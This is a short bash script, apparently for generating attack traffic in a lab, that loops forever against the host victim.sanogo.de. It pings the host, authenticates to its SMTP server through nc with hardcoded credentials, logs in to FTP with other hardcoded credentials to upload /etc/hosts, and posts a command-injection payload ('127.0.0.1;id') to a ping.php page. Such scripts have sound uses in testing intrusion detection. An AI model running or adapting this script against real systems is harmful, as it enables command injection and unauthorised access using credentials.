#!/bin/bash

f_ping()
{
   ping -c 5 $1 
}
f_sendmail()
{
  {
    sleep 1
    echo "EHLO attacker"
    sleep 1
    echo "AUTH LOGIN"
    sleep 1
    echo -n "$2" | base64 | tr -d '\n'
    echo
    sleep 1
    echo -n "$3" | base64 | tr -d '\n'
    echo
    sleep 1
    echo "MAIL FROM:<hacker@$1>"
    sleep 1
    echo "RCPT TO:<root@$1>"
    sleep 1
    echo "DATA"
    sleep 1
    echo "Subject: Ping success!"
    echo
    echo "Victim $VIC is reachable."
    echo "."
    sleep 1
    echo "QUIT"
  } | nc $1 25
}


f_ftp()
{
ftp -inv $1 <<EOF
user $2 $3
put /etc/hosts
bye
EOF
}

f_command()
{
curl -X POST -d "ip=127.0.0.1;id" -d "submit=Ping" $1
}

while true
do
  sleep 1
  f_ping  victim.sanogo.de
  f_sendmail victim.sanogo.de martha mustang
  f_ftp victim.sanogo.de lena FranzFerdi
  f_command http://victim.sanogo.de/ping.php
  f_command https://victim.sanogo.de/ping.php
done

